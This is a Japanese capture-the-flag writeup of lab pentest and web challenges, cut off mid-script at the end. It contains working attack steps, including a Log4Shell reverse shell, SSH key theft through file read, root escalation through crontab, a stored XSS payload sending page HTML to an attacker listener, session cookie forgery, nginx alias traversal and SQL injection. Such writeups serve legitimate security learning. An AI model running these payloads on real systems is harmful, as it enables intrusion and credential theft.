---
title: FFRI × NFLabs. Cybersecurity Challenge 2025 Writeup
date: 2025-09-15
layout: writeup
rank: 3
total_teams: 76
language: ja
tags:
  - web
  - rev
  - pwn
  - pentest
  - misc
---

# まえがき

[FFRI × NFLabs. Cybersecurity Challenge 2025](https://connpass.com/event/356453/)に参加しており、3位だった。
並行してDefCamp CTF Qualsにも出ていた（こちらは決勝進出できずだった）が、このCTFは開催期間が72時間というのもあり、それなりにじっくり取り組むことができた。
![](https://storage.googleapis.com/zenn-user-upload/6fbc2d2c6b7f-20250915.png)
![](https://storage.googleapis.com/zenn-user-upload/078f57f55ea5-20250915.png)

以下、自分が解いた問題のwriteupになる。
かなりLLMに頼っている部分もあるが、そこはご了承願いたい。

# Welcome

## Welcome [175pt / 66 solves]

提出するだけ。
`flag{Good_Luck_and_Have_Fun!}`

# Pentest

## HiddenService [255pt / 50 solves]

nmapで調べると、31337番でApache httpdが動いていることが分かる。

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 10.0.129.53
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 23:09 JST
Nmap scan report for ip-10-0-129-53.ap-northeast-1.compute.internal (10.0.129.53)
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
31337/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
```

アクセスしてみるとshellっぽいUIが表示されたので、`cat /flag*`するとflagが得られた。
![](https://storage.googleapis.com/zenn-user-upload/bcdf7192a0d2-20250914.png)
`flag{Ch4nging_th3_p0rt_is_p0intl3ss}`

## Shell4Solr [425pt / 16 solves]

nmapで調べると、80番でApache Solrが動いていることが分かる。

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 10.0.129.49
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 23:16 JST
Nmap scan report for ip-10-0-129-49.ap-northeast-1.compute.internal (10.0.129.49)
Host is up (0.0017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache Solr
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.37 seconds
```

ブラウザでアクセスするとSolrのコンソールらしき画面が表示される。バージョンが8.11.0、`-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`となっているので、問題文のヒントに書かれている通りlog4j vulnerabilityが有効っぽい。
![](https://storage.googleapis.com/zenn-user-upload/d17097003501-20250914.png)

[GitHubで見つけたレポジトリ](https://github.com/LucasPDiniz/CVE-2021-44228)の通りにncで待機してpayloadを送信すると、コネクションを受け取ることができた。
![](https://storage.googleapis.com/zenn-user-upload/bd4671446b77-20250914.png)

次に、GitHubで[log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)というPoCを見つけたので、これを使ってshellを取りたい。
そのためにはjdk1.8.0が必要だが、攻撃マシンにはjdk17が入っており、ダウングレードしようにもkaliなのでこのバージョンのjdkをaptからインストールすることができない。うーむ。
Oracleの公式ページで公開されているものをDLすれば良さそうだが、なぜかアカウントが作成できず困った。色々打開策を調べて回り、今回は[適当なミラーサーバー](https://mirrors.huaweicloud.com/java/jdk/8u202-b08/)からDLしてPoCが要求しているファイル名に合わせることでどうにかなった。

これでshellが取れたので、`cat /flag*`でflagを得る。
![](https://storage.googleapis.com/zenn-user-upload/4a6c18b146af-20250914.png)
`flag{l0g4j_s0lr_r3vshell}`

## Center [450pt / 9 solves]

### Mission 01 (user.txt) [220pt / 13 solves]

nmapで調べると、80番と8000番でwebアプリっぽいもの、5432番でpostgresが動いていることが分かる。

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 10.0.129.58
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 23:40 JST
Nmap scan report for ip-10-0-129-58.ap-northeast-1.compute.internal (10.0.129.58)
Host is up (0.0020s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http       Tornado httpd 6.5.1
5432/tcp open     postgresql PostgreSQL DB 9.6.0 or later
8000/tcp open     http       Uvicorn
8501/tcp filtered cmtp-mgt
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
```

おそらく8000番の方はバックエンドだろうということで色々調べてみると、openapi docsが公開されていた。ここでは省略するが、LLMと壁打ちしながら各エンドポイントの挙動も調べた。

```
┌──(kali㉿kali)-[~]
└─$ curl -sS http://10.0.129.58:8000/openapi.json | jq '.info, .paths|keys'
[
  "title",
  "version"
]
[
  "/debug/",
  "/login",
  "/me",
  "/v1/challenges",
  "/v1/submit"
]
```

さらに、postgresにsuperuserで入れることも分かった。

```
┌──(kali㉿kali)-[~]
└─$ psql -h 10.0.129.58 -U postgres -d postgres -c "SELECT version();"
psql -h 10.0.129.58 -U postgres -tAc "SELECT rolsuper FROM pg_roles WHERE rolname='postgres';"
                                                              version                                                              
-----------------------------------------------------------------------------------------------------------------------------------
 PostgreSQL 17.5 (Ubuntu 17.5-1.pgdg24.04+1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0, 64-bit
(1 row)

t
```

postgresを調べていると、既存ユーザーのusernameとpasswordを入手できた。

```
┌──(kali㉿kali)-[~]
└─$ psql -h 10.0.129.58 -U postgres -tAc "SELECT datname FROM pg_database WHERE datistemplate=false;"
psql -h 10.0.129.58 -U postgres -d center -tAc "SELECT table_schema||'.'||table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema');"
psql -h 10.0.129.58 -U postgres -d center -c "TABLE public.users;"

postgres
center
public.users
public.challenges
 id | username |   password    |          created_at           
----+----------+---------------+-------------------------------
  1 | azami    | glasses2world | 2025-06-13 18:56:27.179336+00
(1 row)
```

この認証情報を用いてログインし、任意ファイルを読み出せることが分かっていた`/debug`からファイルを読み出すことでflagが得られた。

```
┌──(kali㉿kali)-[~]
└─$ base="http://10.0.129.58:8000"
tok=$(curl -sS -X POST "$base/login" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=azami&password=glasses2world&grant_type=password' \
  | jq -r '.access_token')
echo "TOKEN=$tok"

TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhemFtaSIsImV4cCI6NTQwMTI1ODEyNTB9.2gc70kPWVZlt2M_MQauYGMZ6xQZBZGweXtQjrC6-vtY
                      
┌──(kali㉿kali)-[~]
└─$ curl -sS -H "Authorization: Bearer $tok" \
  "$base/debug/?filepath=/home/ayumu/user.txt"
flag{K41T41_the_0ccult_0f_vuln3r4b1l1ty!}
```

`flag{K41T41_the_0ccult_0f_vuln3r4b1l1ty!}`

### Mission 02 (/root/root.txt) [230pt / 9 solves]

user.txtと同じ要領で`ayumu`ユーザーの秘密鍵を得ることができる。これを用いるとsshでサーバーに入ることができた。

```
┌──(kali㉿kali)-[~]
└─$ curl -sS -H "Authorization: Bearer $tok" \
  "$base/debug/?filepath=/home/ayumu/.ssh/id_ed25519" > id_ed25519.ayumu
chmod 600 id_ed25519.ayumu
ssh -i id_ed25519.ayumu ayumu@10.0.129.58 -o StrictHostKeyChecking=no 
Warning: Permanently added '10.0.129.58' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)
...(略)
ayumu@ayumi:~$ 
```

root.txtを読み出すにはroot権限が必要だが、当然`ayumu`ユーザーには権限がない。[LinPEAS](https://github.com/peass-ng/PEASS-ng/releases)で使えそうな脆弱性が無いか調べてその結果をLLMに投げた。
すると、tmuxで`samezima`ユーザーのshellに入れることが分かった。

```
tmux -S /tmp/tmux-1001/default attach -t admin  ||  tmux -S /tmp/tmux-1001/default attach -t webservers
```

ここで`sudo -l`すると、crontabだけはパスワード無しでsudoできることが分かった。

```
samezima@ayumi:~$ sudo -l
Matching Defaults entries for samezima on ayumi:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User samezima may run the following commands on ayumi:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/crontab -u root -l, /usr/bin/crontab -u root -e
```

あとはcrontabに`* * * * * /bin/cat /root/root.txt >/tmp/r00t && /bin/chmod 644 /tmp/r00t`の行を追記し、cronが実行されるまで待つだけ。

```
samezima@ayumi:~$ sudo /usr/bin/crontab -u root -e
crontab: installing new crontab
samezima@ayumi:~$ sleep 70 && cat /tmp/r00t
flag{Y0ur_r1ght_h4nd_15_4_b4d455_h4ck3r_ju5t_l1k3_m3!!}
```

`flag{Y0ur_r1ght_h4nd_15_4_b4d455_h4ck3r_ju5t_l1k3_m3!!}`

## Enumeration [484pt / 2 solves]

### Mission 01 (Linuxサーバー) [157pt / 7 solves]

nmapで調べると、nginxが複数動いていることが分かる。

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 10.0.129.156
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 13:10 JST
Nmap scan report for ip-10-0-129-156.ap-northeast-1.compute.internal (10.0.129.156)
Host is up (0.0017s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
53/tcp   open  tcpwrapped
80/tcp   open  http       nginx
8060/tcp open  http       nginx 1.29.0
8480/tcp open  http       nginx
Service Info: Host:  ip-172-31-11-83.ap-northeast-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.12 seconds
```

適当にcurlを飛ばしてみると、それぞれレスポンスが返ってきた。

```
┌──(kali㉿kali)-[~]
└─$ T=10.0.129.156
for p in 80 8060 8480; do
  echo -e "\n--- PORT $p ---"
  curl -skI "http://$T:$p/" | sed -n '1,20p'
done


--- PORT 80 ---
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Mon, 15 Sep 2025 04:12:43 GMT
Content-Type: text/html
Content-Length: 162
Location: http://www.mirai-itsystems.local/
Cache-Status: unkown;detail=no-cache
Via: 1.1 unkown (squid/6.6)
Connection: keep-alive


--- PORT 8060 ---
HTTP/1.1 404 Not Found
Server: nginx/1.29.0
Date: Mon, 15 Sep 2025 04:12:43 GMT
Content-Type: text/html
Content-Length: 153
Cache-Status: unkown;detail=no-cache
Via: 1.1 unkown (squid/6.6)
Connection: keep-alive


--- PORT 8480 ---
HTTP/1.1 302 Found
Server: nginx
Date: Mon, 15 Sep 2025 04:12:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Cache-Control: no-cache
Content-Security-Policy: 
Location: http://10.0.129.156:8480/users/sign_in
Nel: {"max_age": 0}
Permissions-Policy: interest-cohort=()
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Gitlab-Meta: {"correlation_id":"01K55S6E0ZV4V3NG6VSAA56X6S","version":"1"}
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 01K55S6E0ZV4V3NG6VSAA56X6S
X-Runtime: 0.043489
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
Strict-Transport-Security: max-age=63072000
```

`X-Gitlab-Meta`ヘッダから、8480番ポートで動いているのはGitLabだと推測できる。

公開されているプロジェクト候補を探す。`/mirai-it-systems/www.mirai-itsystems.local`という怪しいプロジェクトが見つかった。

```
┌──(kali㉿kali)-[~]
└─$ BASE="http://$T:8480"
# 公開プロジェクト候補を抽出
curl -sk "$BASE/explore/projects" | grep -Eo '/[A-Za-z0-9._-]+/[A-Za-z0-9._-]+' | sort -u | sed -n '1,60p'
/-/cable
/-/collect_events
/-/forks
/-/issues
/-/manifest.json
/-/merge_requests
/-/starrers
/about.gitlab.com/get-help
/about.gitlab.com/pricing
/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png
...(略)
/assets/twitter_card-570ddb06edf56a2312253c5872489847a0f385112ddbcd71ccfa1570febab5d2.jpg
/assets/webpack
/dashboard/issues
/dashboard/merge_requests
/explore/catalog
/explore/groups
/explore/projects
/explore/snippets
/gitlab_standard/jsonschema
/help/docs
/mirai-it-systems/www.mirai-itsystems.local
/ogp.me/ns
/search/autocomplete
/search/opensearch.xml
/search/settings
/themes/dark-de44bcd749657b6c80de61f53cc5a9d8249bfa3c413c5268507c0616da310479.css
/themes/white-8fe3933b046776818759e684f787d451d645d7517b7f6e4addc17aed98595997.css
/users/sign_in
/users/sign_up
/www.w3.org/2000
```

`git clone`で手元に落として色々調べる。

```
┌──(kali㉿kali)-[~]
└─$ PROJ=/mirai-it-systems/www.mirai-itsystems.local
cd /tmp
git ls-remote "$BASE$PROJ.git"
git clone --depth=1 "$BASE$PROJ.git" site
cd site
0a9dd43c14f3c1268528be1a70b86e52d9517388        HEAD
0a9dd43c14f3c1268528be1a70b86e52d9517388        refs/heads/master
Cloning into 'site'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 12 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 17.25 MiB | 29.49 MiB/s, done.
```

過去のコミットを走査して怪しいファイルが無いか探すと、ssh秘密鍵っぽいものがヒットした。

```
┌──(kali㉿kali)-[/tmp/site]
└─$ git fetch --unshallow 2>/dev/null || git fetch --depth=10000
for pat in 'BEGIN OPENSSH PRIVATE KEY' 'BEGIN RSA PRIVATE KEY' 'DB_PASSWORD' 'PASSWORD' 'SECRET' 'TOKEN' ; do
  echo "=== $pat ==="
  git rev-list --all | while read c; do git grep -n "$pat" "$c"; done | head -n 40
done

=== BEGIN OPENSSH PRIVATE KEY ===
e756a2652f621867e15835f474434f5e12402bd9:id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
=== BEGIN RSA PRIVATE KEY ===
=== DB_PASSWORD ===
=== PASSWORD ===
=== SECRET ===
=== TOKEN ===
```

このssh秘密鍵を抜き出す。

```
┌──(kali㉿kali)-[/tmp/site]
└─$ C=e756a2652f621867e15835f474434f5e12402bd9
git show $C:id_ed25519 | tee /tmp/key_ed25519.pem >/dev/null
chmod 600 /tmp/key_ed25519.pem
ssh-keygen -lf /tmp/key_ed25519.pem
ssh-keygen -y  -f /tmp/key_ed25519.pem | tee /tmp/key_ed25519.pub 
```

コメントからユーザー名候補を抜き出す。

```
┌──(kali㉿kali)-[/tmp/site]
└─$ awk '{print $3}' /tmp/key_ed25519.pub | cut -d@ -f1
m.yamada
```

得られたユーザー名と秘密鍵でsshしてみる。

```
┌──(kali㉿kali)-[/tmp/site]
└─$ chmod 600 /tmp/key_ed25519.pem                       
ssh -i /tmp/key_ed25519.pem m.yamada@10.0.129.156
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.14.0-1011-aws x86_64)
...(略)
m.yamada@ip-10-0-129-156:~$
```

ログインできた。flagを読み出す。

```
m.yamada@ip-10-0-129-156:~$ ls
user.txt
m.yamada@ip-10-0-129-156:~$ cat user.txt 
flag{Z9cfPPYpGx6wnJQZxurDiThmUtrgmCpv}
```

`flag{Z9cfPPYpGx6wnJQZxurDiThmUtrgmCpv}`

### Mission 02 (Windowsサーバー) [162pt / 4 solves]

解けなかった。

### Mission 03 (root.txt) [165pt / 2 solves]

解けなかった。

# Web Exploitation

## Secure Web Company [300pt / 41 solves]

Dockerfileを見ると、なぜかREADME.mdまで公開されている。

```Dockerfile
FROM nginx:alpine
COPY index.html script.js style.css README.md /usr/share/nginx/html/
```

よって、`/README.md`にアクセスすれば良い。

```
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.129.17:8090/README.md
# 開発者向け

## 管理画面認証情報

- ユーザー名: admin
- パスワード: flag{5up3r53cr37_4dm1n_p455w0rd}
```

`flag{5up3r53cr37_4dm1n_p455w0rd}`

## Timecard [380pt / 25 solves]

flagはmanagerのdashboardに表示されている。また、`timecard.remarks`に自明なXSSが存在する。

{% raw %}
```html
<body>
    <h1>ようこそ、{{ current_user.username }}さん</h1>
    <p><a href="/logout">ログアウトはこちら</a></p>
    <p>{{ flag }}</p>
    <h2>申請一覧</h2>
    {% with messages = get_flashed_messages(with_categories=true) %} {% if messages %}
    <div class="flashes">
        {% for category, message in messages %}
        <div class="{{ category }}">{{ message }}</div>
        {% endfor %}
    </div>
    {% endif %} {% endwith %}
    <ul>
        {% for timecard in timecards %}
            <li>
                {{ timecard.date }}: {{ timecard.start_time }} - {{ timecard.end_time }} ({{ timecard.remarks }})
                <!-- 状態表示 -->
                {% if timecard.cancel_requested %}
                    - <span style="color:orange;">取り消し申請中</span>
                    <form action="{{ url_for('approve_timecard', timecard_id=timecard.id) }}" method="post" style="display:inline;">
                        <button type="submit">取り消し申請承認</button>
                    </form>
                {% elif timecard.approved %}
                    - <span style="color:green;">承認済み</span>
                {% else %}
                    - <span style="color:red;">未承認</span>
                    <form action="{{ url_for('approve_timecard', timecard_id=timecard.id) }}" method="post" style="display:inline;">
                        <button type="submit">承認</button>
                    </form>
                {% endif %}
            </li>
        {% endfor %}
    </ul>
</body>
```
{% endraw %}

manager botが毎分dashboardを巡回し、申請を承認していく。よって、`timecard.remarks`にStored XSSを仕込み、`document.documentElement.outerHTML`を外部に送信することでflagが得られる。

さて、ローカルで解けたので意気揚々と問題サーバーにpayloadを投げたが、いつまで経ってもいつも使っているrequestbinにflagが飛んでこない。困った。
色々検証した結果、どうやら問題サーバーは外部ネットワークへアクセスできないのではないかとアタリを付け、問い合わせたら案の定ビンゴ。ルールに追記された。
![](https://storage.googleapis.com/zenn-user-upload/5bbeede91dad-20250915.png)

ということで、攻撃マシン側でリクエストを待ち受ける準備をする。

```
nc -lvnp 8080
```

これでようやく、問題サーバーの社員アカウントでログインして以下のpayloadを備考欄に入れて申請し、しばらく待つことでflagが得られた。

```html
<img src=x onerror="(()=>{try{navigator.sendBeacon('http://10.0.0.38:8080',new Blob([document.documentElement.outerHTML],{type:'text/plain'}))}catch(e){}})()">
```

`flag{H9aDSMkTCWZMEuk25nZw}`

ネットワークで詰まらなければ1st bloodが取れていたので悔しい。提供されたものはちゃんと予め準備してちゃんと使った方が良いという教訓になった。

## TimeFiles [420pt / 17 solves]

adminのセッションで`/flag`へアクセスすると`utils.EncryptAes()`でエンコードされたflagが得られる。

```go
func flag(w http.ResponseWriter, r *http.Request) {
 session, _ := store.Get(r, "session")
 username, ok1 := session.Values["username"].(string)
 if auth, ok2 := session.Values["authenticated"].(bool); !ok1 || !ok2 || username != "admin" || !auth {
  http.Redirect(w, r, "/login", http.StatusFound)
  return
 }

 tmpl, err := template.ParseFiles("templates/flag.html")
 if err != nil {
  http.Error(w, "Error loading page", http.StatusInternalServerError)
  return
 }

 w.Header().Set("AccessTime", strconv.FormatInt(time.Now().UnixMilli(), 10))

 flag := os.Getenv("FLAG")
 flag = utils.EncryptAes(flag)
 tmpl.Execute(w, map[string]string{"Flag": flag})
}
```

このsessionはどうやって生成されているかを確認すると、なんとハッシュ鍵が`auth-cookie`で固定されている。つまり偽造し放題。

```go
var store = sessions.NewCookieStore([]byte("auth-cookie"))

...(略)

  if password == user.Password {
   session, _ := store.Get(r, "session")
   session.Values["authenticated"] = true
   session.Values["username"] = username
   session.Save(r, w)
   http.Redirect(w, r, "/flag", http.StatusFound)

  } else {
   tmpl, err := template.ParseFiles("templates/login_error.html")
   if err != nil {
    http.Error(w, "Error loading page", http.StatusInternalServerError)
    return
   }
   tmpl.Execute(w, nil)
  }
```

よって、このようなコードでsessionを生成し、adminになりすますことができる。

```go
package main

import (
 "fmt"
 "net/http"

 "github.com/gorilla/securecookie"
 "github.com/gorilla/sessions"
)

func main() {
 store := sessions.NewCookieStore([]byte("auth-cookie"))
 req, _ := http.NewRequest("GET", "/", nil) // ダミー
 session, _ := store.New(req, "session")    // cookie 名 = "session"
 session.Values["authenticated"] = true
 session.Values["username"] = "admin"

 encoded, _ := securecookie.EncodeMulti(
  "session", session.Values, store.Codecs...)

 fmt.Println(encoded)
}
```

このsessionを用いて`/flag`にアクセスすると、暗号化されたflagが得られた。

```
┌──(kali㉿kali)-[~]
└─$ curl -i -b "session=MTc1NzY2OTgxNXxEWDhFQVFMX2dBQUJFQUVRQUFCSV80QUFBZ1p6ZEhKcGJtY01Ed0FOWVhWMGFHVnVkR2xqWVhSbFpBUmliMjlzQWdJQUFRWnpkSEpwYm1jTUNnQUlkWE5sY201aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzsw069CneOeNnoVaBbQfXYh2S9XzMR8GCrL6sv7XZ-FA==" http://10.0.129.67:8092/flag
HTTP/1.1 200 OK
Accesstime: 1757868300451
Date: Sun, 14 Sep 2025 16:45:00 GMT
Content-Length: 625
Content-Type: text/html; charset=utf-8
Cache-Status: unkown;detail=no-cache
Via: 1.1 unkown (squid/6.6)
Connection: keep-alive

<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>CTF Flag Page</title>
  <style>
    body {
      background-color: #1e1e1e;
      color: #00ff00;
      font-family: monospace;
      text-align: center;
      padding-top: 100px;
    }
    .flag-box {
      border: 2px dashed #00ff00;
      display: inline-block;
      padding: 20px;
      font-size: 24px;
      background-color: #000;
    }
  </style>
</head>
<body>
  <div class="flag-box">
     Congratulations!<br>
    Your (encrypted) flag is:<br>
    <strong>c1JC2cLPkI40jGgwOAu5Fu7vIctz3O2A9iBg3Nyybbk=</strong>
  </div>
</body>
</html>
```

あとは復号できれば良いので、`utils.EncryptAes()`を見る。独自実装のAESになっていて、0~999ms待機した後の時刻のミリ秒をseedとしてkeyを生成しているようだ。
さっきの`/flag`のレスポンスを見ると、おあつらえ向きにも`Accesstime`ヘッダが付いており、大体の時間が分かる。

```go
package utils

import (
 "crypto/aes"
 "crypto/cipher"
 "encoding/base64"
 "fmt"
 "math/rand"
 "strconv"
 "time"
)

func generateKey() []byte {
 delay := rand.Intn(1000)
 time.Sleep(time.Duration(delay) * time.Millisecond)
 var seedTime = time.Now().UnixMilli()
 fmt.Println(strconv.FormatInt(seedTime, 10))
 random := rand.New(rand.NewSource(seedTime))

 key := make([]byte, 16)
 for i := 0; i < 4; i++ {
  val := random.Uint32()
  key[i*4+0] = byte(val >> 24)
  key[i*4+1] = byte(val >> 16)
  key[i*4+2] = byte(val >> 8)
  key[i*4+3] = byte(val)
 }

 return key
}

func pad(src []byte, blockSize int) []byte {
 padding := blockSize - len(src)%blockSize
 padtext := make([]byte, padding)
 for i := range padtext {
  padtext[i] = byte(padding)
 }
 return append(src, padtext...)
}

func EncryptAes(plainText string) string {
 key := generateKey()
 plainBytes := []byte(plainText)

 block, err := aes.NewCipher(key)
 if err != nil {
  panic(err)
 }

 plainBytes = pad(plainBytes, block.BlockSize())

 iv := []byte{0x1a, 0x2b, 0x3c, 0x4d, 0x5e, 0x6f, 0x70, 0x81, 0x92, 0xa3, 0xb4, 0xc5, 0xd6, 0xe7, 0xf8, 0x09}

 mode := cipher.NewCBCEncrypter(block, iv)
 ciphertext := make([]byte, len(plainBytes))
 mode.CryptBlocks(ciphertext, plainBytes)

 return base64.StdEncoding.EncodeToString(ciphertext)
}
```

`AccessTime`ヘッダの値を使って0~999msの遅延を総当たりで試し、復号するプログラムをLLMに書いてもらった。

```go
// decrypt.go
package main

import (
 "crypto/aes"
 "crypto/cipher"
 "encoding/base64"
 "fmt"
 "math/rand"
 "os"
 "strconv"
 "strings"
)

var iv = []byte{0x1a, 0x2b, 0x3c, 0x4d, 0x5e, 0x6f, 0x70, 0x81,
 0x92, 0xa3, 0xb4, 0xc5, 0xd6, 0xe7, 0xf8, 0x09}

func keyFromSeed(seed int64) []byte {
 r := rand.New(rand.NewSource(seed))
 k := make([]byte, 16)
 for i := 0; i < 4; i++ {
  v := r.Uint32()
  k[i*4+0] = byte(v >> 24)
  k[i*4+1] = byte(v >> 16)
  k[i*4+2] = byte(v >> 8)
  k[i*4+3] = byte(v)
 }
 return k
}

func main() {
 if len(os.Args) != 3 {
  fmt.Println("usage: go run decode.go <BASE64_CT> <ACCESS_TIME_MS>")
  return
 }
 ctB64 := os.Args[1]
 base, _ := strconv.ParseInt(os.Args[2], 10, 64)
 ct, _ := base64.StdEncoding.DecodeString(ctB64)

 for off := int64(0); off < 1000; off++ { // ±0-999 ms で総当り
  seed := base + off
  key := keyFromSeed(seed)
  block, _ := aes.NewCipher(key)

  plain := make([]byte, len(ct))
  cipher.NewCBCDecrypter(block, iv).CryptBlocks(plain, ct)

  // PKCS#7 削除
  pad := int(plain[len(plain)-1])
  if pad == 0 || pad > 16 {
   continue
  }
  msg := plain[:len(plain)-pad]
  if strings.HasPrefix(string(msg), "flag{") {
   fmt.Println(string(msg))
   return
  }
 }
}
```

これを実行するとflagが得られた。
`flag{43s_f4s7_bu7_71m3_s10w3r}`

#### 別解

`utils.SearchContent()`に自明なSQL Injectionが存在するので、ここから`pg_read_file()`で`admin.xml`内のpasswordを抜き取ってログイン出来るらしい。

```go
func SearchContent(title string) (PageData, error) {
 var data PageData
 db, err := ConnectDB()
 if err != nil {
  return data, err
 }
 defer db.Close()

 queryStr := "SELECT * from msgs where title ILIKE '%" + title + "%'"
 fmt.Println(queryStr)

 rows, err := db.Query(queryStr)

 if err != nil {
  return data, err
 }
 data.Keyword = title
 defer rows.Close()

 for rows.Next() {
  var msg Message
  err = rows.Scan(&msg.Title, &msg.Content)
  fmt.Printf("%s %s\n", msg.Title, msg.Content)
  data.Messages = append(data.Messages, msg)
 }

 return data, err
}
```

## Cereal Blog [480pt / 5 solves]

問題文より、3つの脆弱性があるらしい。
`entrypoint.sh`を確認すると、flagは推測不可能なファイル名でサーバー内にあるらしい。つまり、RCEが必要になる。

```sh
#!/bin/sh

mv flag.txt /flag_$(openssl rand -hex 32).txt

php /var/www/html/app/seeds/init.php

nginx -g 'daemon off;' &
. docker-php-entrypoint php-fpm
```

まず1つ目の脆弱性は`nginx.conf`にあり、`/uploads`で[Alias Traversal](https://qiita.com/y-okamon/items/ddecd0b69d93b7929574)が可能になっている。

```
    location /uploads {
        alias /var/www/html/uploads/;
        try_files $uri =404;
    }
```

よって、以下のようなリクエストでjwt生成に使用している秘密鍵を抜き取ることができる。

```sh
curl -sS http://10.0.128.226:8093/uploads../secret/private.key -o private.key
```

次に、`POST /mypage/post/{post_id}`から呼ばれる関数`findImage()`にSQL injectionの脆弱性が存在する。

```php
public static function findImage($user_id, $post_id, $filename)
{
    $filename = self::sanitize($filename);

    $db = \Core\Model::init_db();
    $stmt = $db->prepare("SELECT * FROM posts WHERE user_id = ? AND id = ? AND filename = '{$filename}'");
    $stmt->execute([$user_id, $post_id]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```

一応sanitizeされており、sleepなどのtime-based blind SQL injectionに使えそうな関数は封じられている。しかし、これら以外の関数は使えるので色々できそう。

```php
public static function sanitize($str)
{
    $blacklist = ["gtid_subset", "extractvalue", "sleep", "information_schema", "benchmark"];
    return str_ireplace($blacklist, '', $str);
}
```

ここでは`updatexml`に変な文字を渡すことでエラーを発生させる。試しにfilenameを`' OR updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --`とすると、通常は302が返ってくるはずが、500が返ってきた。これをオラクルとしてerror-based blind SQL injectionでadminユーザーのuuidを1文字ずつ特定していく。

ちなみにfilenameは何でも良いが、画像ファイルはちゃんと画像として正しいものじゃないとエラーがMIMEチェックで弾かれるため、適当に用意してあげる必要がある。

頑張ってSQLパズルを組んで1文字ずつ特定していくスクリプトを書いた。なお、この`TARGET`と`TOKEN`は予め作成しておいたユーザー（adminでなくて良い）の投稿とトークンとなる。

```js
const TARGET = "http://10.0.128.226:8093/mypage/post/21";
